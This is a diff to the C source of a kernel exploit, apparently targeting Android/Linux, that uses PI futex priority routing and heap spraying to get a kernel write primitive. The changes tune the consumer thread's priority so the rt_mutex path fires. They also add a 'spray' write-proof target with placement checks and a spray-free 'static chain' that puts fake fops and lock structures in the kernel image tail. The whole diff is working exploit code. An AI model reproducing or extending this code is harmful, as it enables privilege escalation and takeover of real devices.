@@ -140,6 +140,9 @@ atomic_int owner_unlock_done;
 atomic_int requeue_done;
 atomic_int route_done;
 atomic_int waiter_tid;
+/* Per-phase consumer nice: each walk must CHANGE the waiter task's prio,
+ * or __sched_setscheduler returns early and rt_mutex_adjust_pi never runs. */
+int consumer_nice = PSELECT_CONSUMER_NICE;
 atomic_int punch_consume_go;
 atomic_int punch_consume_stop;
 atomic_int consumer_calls;
@@ -244,7 +247,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         errno = 0;
         if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0))
           durable_proof_log("pre_setattr");
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
         pr_info("consumer punch tid=%d sched_ret=%ld errno=%d\n", tid,
                 sched_ret, errno);
         if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0)) {
@@ -748,6 +751,7 @@ int run_exploit(int argc, char **argv) {
   if (write_proof && umh_available && !force_w1) {
     char boot_before[80];
     char boot_after[80];
+    int spray_verify_ret = -2;
     char enf_before[8];
     char enf_after[8];
     read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
@@ -773,6 +777,10 @@ int run_exploit(int argc, char **argv) {
       proof_tgt = data_addr(ASHMEM_MISC_FOPS);
       proof_val = 0;
       desc = "WRITE_PROOF fops (only-left *MISC=fake_fops)";
+    } else if (!strcmp(tgt_name, "spray")) {
+      proof_tgt = 0; /* late-bound in fops.c/util.c stamps (MODE4_WPROOF_SPRAY) */
+      proof_val = 0;
+      desc = "WRITE_PROOF spray marker (*(fake_fops+0x90)=fake_fops+0x80)";
     } else {
       /* Prefer p0-profile sysctl_bootid if same as SLIDE; else slide_boot_id */
       uint64_t boot_off =
@@ -798,11 +806,26 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
     TIMER("  heap spray start");
     durable_stage("spray_start");
+    if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+        !env_flag("MODE4_SC_SPRAY", 0)) {
+      /* Spray-free chain: table lives in the kernel image tail;
+       * dummies satisfy do_pselect_fake_lock_route guards. */
+      uint64_t tail = data_addr(KIMAGE_TEXT_BASE +
+                                (active_offsets
+                                     ? active_offsets->off_bss_tail_lock
+                                     : 0));
+      page_base = tail;
+      fake_lock = tail + 0x400;
+      fake_fops = tail;
+      binwrite_target = tail + 0x200;
+      pr_info("STATIC_CHAIN: spray skipped, tail=%016zx\n", tail);
+    } else {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
     if (!page_base) {
       pr_error("WRITE_PROOF heap spray failed\n");
       clear_pselect_write();
       return 1;
+    }
     }
     /* If fops path left value 0, payload set pselect_custom_value=fake_fops;
      * re-stamp stack uses that via pselect_custom_value in prepare_pselect. */
@@ -814,6 +837,15 @@ int run_exploit(int argc, char **argv) {
     durable_stage("route_threads_returned");
     TIMER("  PI route done");
     clear_pselect_write();
+    if (!strcmp(tgt_name, "spray")) {
+      int v = wproof_spray_verify((uint64_t)fake_fops + 0x80);
+      durable_stage(v == 1 ? "spray_placement_VERIFIED"
+                           : (v == 0 ? "spray_placement_MISMATCH"
+                                     : "spray_placement_NOTABLE"));
+      pr_success("WRITE_PROOF spray verify ret=%d (1=verified, 0=mismatch, "
+                 "-1=no table)\n", v);
+      spray_verify_ret = v;
+    }
 
     read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                     sizeof(boot_after));
@@ -825,6 +857,8 @@ int run_exploit(int argc, char **argv) {
       landed = enf_wrote;
     else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))
       landed = (cfi_last_step == 0 && cfi_dirty_seen) || (cfi_write_ret > 0);
+    else if (!strcmp(tgt_name, "spray"))
+      landed = (spray_verify_ret == 1);
     else
       landed = boot_wrote;
 
